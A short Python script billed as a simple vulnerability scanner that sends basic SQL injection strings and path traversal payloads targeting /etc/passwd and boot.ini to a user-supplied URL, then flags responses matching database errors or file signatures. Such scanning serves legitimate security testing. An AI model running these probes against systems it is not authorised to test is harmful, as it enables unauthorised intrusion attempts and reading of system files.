import requests
import re
import argparse

sqli_payloads = ["' OR '1'='1", "'--", "\" OR \"1\"=\"1"]
sqli_errors = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"Unclosed quotation mark",
    r"ORA-01756"
]

traversal_payloads = ["../../../../etc/passwd", "..\\..\\..\\boot.ini"]
traversal_signatures = ["root:x:", "[boot loader]"]

def scan_sql_injection(base_url):
    print("\n[+] Scanning for SQL Injection...")
    for payload in sqli_payloads:
        test_url = f"{base_url}?id={payload}"
        print(f"[*] Testing: {test_url}")
        try:
            response = requests.get(test_url, timeout=5)
            for pattern in sqli_errors:
                if re.search(pattern, response.text, re.IGNORECASE):
                    print(f"[!] Possible SQL Injection at: {test_url}")
                    break
        except requests.exceptions.RequestException:
            continue

def scan_directory_traversal(base_url):
    print("\n[+] Scanning for Directory Traversal...")
    for payload in traversal_payloads:
        test_url = f"{base_url}?file={payload}"
        print(f"[*] Testing: {test_url}")
        try:
            response = requests.get(test_url, timeout=5)
            for signature in traversal_signatures:
                if signature in response.text:
                    print(f"[!] Possible Directory Traversal at: {test_url}")
                    break
        except requests.exceptions.RequestException:
            continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple Vulnerability Scanner")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/page.php)")
    args = parser.parse_args()

    scan_sql_injection(args.url)
    scan_directory_traversal(args.url)
